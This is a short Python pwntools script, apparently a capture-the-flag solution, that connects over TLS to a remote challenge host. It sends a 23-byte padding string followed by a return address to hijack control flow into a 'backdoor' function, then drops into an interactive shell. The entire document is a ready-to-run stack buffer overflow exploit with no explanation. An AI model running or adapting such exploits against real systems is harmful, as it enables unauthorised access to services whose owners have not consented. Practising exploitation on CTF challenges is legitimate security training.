from pwn import context

from pwn import *

context.log_level = 'info'

HOST = '8775b11652ba4e9f26e7daa4.tcp-ctf2.dasctf.com'
PORT = 9999

BACKDOOR_ADDR = 0x401186 + 1

PADDING = 23

def exploit():
    log.info(f"Connecting to {HOST}:{PORT} (TLS)")

   
    io = remote(HOST, PORT, ssl=True, sni=HOST)

    payload = b'A' * PADDING
    payload += p64(BACKDOOR_ADDR)

    log.info(f"Sending payload ({len(payload)} bytes) -> backdoor @ {hex(BACKDOOR_ADDR)}")
    io.sendline(payload)

    io.interactive()


if __name__ == '__main__':
    exploit()